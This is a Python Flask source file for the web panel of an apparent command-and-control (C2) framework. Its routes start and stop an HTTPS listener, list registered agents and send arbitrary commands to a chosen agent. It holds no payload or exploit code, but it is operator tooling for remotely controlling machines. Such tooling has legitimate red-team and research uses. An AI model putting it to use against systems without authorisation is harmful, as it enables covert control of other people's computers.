# src/web_panel/c2_views.py
import json # Added for parsing JSON strings from DB
from flask import Blueprint, render_template, request, redirect, url_for, flash
from flask import current_app # To access plugin_manager if stored on app
import time # For formatting timestamps if needed, though Jinja filter is better

c2_bp = Blueprint('c2', __name__, url_prefix='/c2', template_folder='templates/c2')

def get_c2_plugin():
    # Ensure plugin_manager is attached to current_app correctly in app.py
    if not hasattr(current_app, 'plugin_manager'):
        # This flash won't be visible if plugin_manager itself is missing
        # flash("Plugin manager not found on application context.", "critical_error")
        print("CRITICAL: Plugin manager not found on application context.")
        return None
    
    pm = current_app.plugin_manager
    # The plugin name is "C2 Manager" as defined in C2ManagerPlugin.get_name()
    plugin_data = pm.plugins.get("C2 Manager") 
    if plugin_data and plugin_data.get('instance'):
        return plugin_data['instance']
    
    # flash("C2 Manager plugin not found or not loaded.", "error") # Flashing here might be too early for some contexts
    print("ERROR: C2 Manager plugin not found or not loaded.")
    return None

@c2_bp.route('/')
def index():
    return redirect(url_for('c2.listeners'))

@c2_bp.route('/listeners', methods=['GET', 'POST'])
def listeners():
    c2_plugin = get_c2_plugin()
    if not c2_plugin:
        flash("C2 Manager plugin not available.", "danger")
        # Render a minimal page or redirect, as c2_base.html might rely on c2_plugin too
        return render_template('c2_error.html', error_message="C2 Manager plugin not available.")


    if request.method == 'POST':
        action = request.form.get('action')
        if action == 'start_listener':
            host = request.form.get('host', '0.0.0.0')
            port_str = request.form.get('port', '8443')
            try:
                port = int(port_str)
                result = c2_plugin.execute_action('start_https_listener', {'host': host, 'port': port})
                if result.get('status') == 'error':
                    flash(result.get('message', 'Unknown error starting listener.'), "danger")
                else:
                    flash(result.get('message', 'Listener action processed.'), "success")
            except ValueError:
                flash("Invalid port number provided.", "danger")
            except NotImplementedError:
                flash("Start listener functionality is not fully implemented in the plugin yet.", "warning")
            except Exception as e:
                flash(f"Error starting listener: {str(e)}", "danger")
        elif action == 'stop_listener':
            try:
                result = c2_plugin.execute_action('stop_https_listener', {})
                if result.get('status') == 'error':
                    flash(result.get('message', 'Unknown error stopping listener.'), "danger")
                else:
                    flash(result.get('message', 'Listener action processed.'), "success")
            except NotImplementedError:
                flash("Stop listener functionality is not fully implemented in the plugin yet.", "warning")
            except Exception as e:
                flash(f"Error stopping listener: {str(e)}", "danger")
        return redirect(url_for('c2.listeners'))

    listener_status_data = {}
    try:
        listener_status_data = c2_plugin.execute_action('get_listener_status', {})
    except Exception as e:
        flash(f"Error getting listener status: {str(e)}", "danger")
        # listener_status_data will remain empty, template should handle this
    
    return render_template('listeners.html', listener_status=listener_status_data)


@c2_bp.route('/agents')
def agents():
    c2_plugin = get_c2_plugin()
    if not c2_plugin:
        flash("C2 Manager plugin not available.", "danger")
        return render_template('c2_error.html', error_message="C2 Manager plugin not available.")
    
    agents_list_data = []
    try:
        agents_list_from_plugin = c2_plugin.execute_action('list_registered_agents', {})
        if isinstance(agents_list_from_plugin, dict) and agents_list_from_plugin.get('error'):
            flash(f"Error listing agents: {agents_list_from_plugin['error']}", "danger")
            agents_list_data = []
        elif isinstance(agents_list_from_plugin, list):
            agents_list_data = []
            for agent in agents_list_from_plugin:
                # The 'os_info' field is directly populated as TEXT in DB, not JSON.
                # 'initial_data' is stored as JSON string and needs parsing for detailed view.
                # For the main agent list, we might only display basic fields from 'os_info' or 'initial_data.hostname'
                # No complex parsing needed here for 'os_info' for the main list display,
                # as the template will access agent.os_info (which is text)
                # or agent.initial_data (which is a string here, parsed in detail view)
                agents_list_data.append(agent) # Pass agent dicts as is for now.
        else:
            agents_list_data = []
            flash("Received unexpected data type for agents list.", "warning")

    except Exception as e:
        flash(f"Error listing agents: {str(e)}", "danger")
        agents_list_data = []

    return render_template('agents.html', agents_list=agents_list_data)


@c2_bp.route('/agent/<agent_id>', methods=['GET', 'POST'])
def agent_detail(agent_id):
    c2_plugin = get_c2_plugin()
    if not c2_plugin:
        flash("C2 Manager plugin not available.", "danger")
        return redirect(url_for('c2.agents')) # Redirect if plugin is gone

    if request.method == 'POST':
        command = request.form.get('command')
        if command:
            try:
                result = c2_plugin.execute_action('send_command_to_agent', {'agent_id': agent_id, 'command': command})
                if result and result.get('status') == 'error':
                    flash(f"Error sending command: {result['error']}", 'danger')
                else:
                    flash(f"Command '{command}' sent. Result: {result.get('message', 'Processed.')}", 'success')
            except Exception as e:
                 flash(f"Error sending command: {str(e)}", 'danger')
        return redirect(url_for('c2.agent_detail', agent_id=agent_id))

    agent_info_data = {}
    try:
        agent_info_data = c2_plugin.execute_action('get_agent_details', {'agent_id': agent_id})
        
        if not agent_info_data or (isinstance(agent_info_data, dict) and agent_info_data.get('error')):
            flash(f"Could not retrieve details for agent {agent_id}: {agent_info_data.get('error', 'Agent not found or error.')}", "danger")
            return redirect(url_for('c2.agents'))

        # Parse 'initial_data' if it's a string
        if agent_info_data and isinstance(agent_info_data.get('initial_data'), str):
            try:
                agent_info_data['initial_data'] = json.loads(agent_info_data['initial_data'])
            except json.JSONDecodeError:
                print(f"Error decoding initial_data JSON for agent {agent_id}: {agent_info_data['initial_data']}")
                flash(f"Warning: Could not parse initial agent data for agent {agent_id}.", "warning")
                agent_info_data['initial_data_str_error'] = agent_info_data['initial_data'] # Keep original string for display if needed
                agent_info_data['initial_data'] = {} # Default to empty dict on error
        
        # 'os_info' is a direct TEXT field from DB, not expected to be JSON here.
        # 'command_history' should already be a list of dicts from the plugin.

    except Exception as e:
        flash(f"Error retrieving agent details: {str(e)}", "danger")
        return redirect(url_for('c2.agents'))
       
    return render_template('agent_detail.html', agent_id=agent_id, agent_info=agent_info_data)
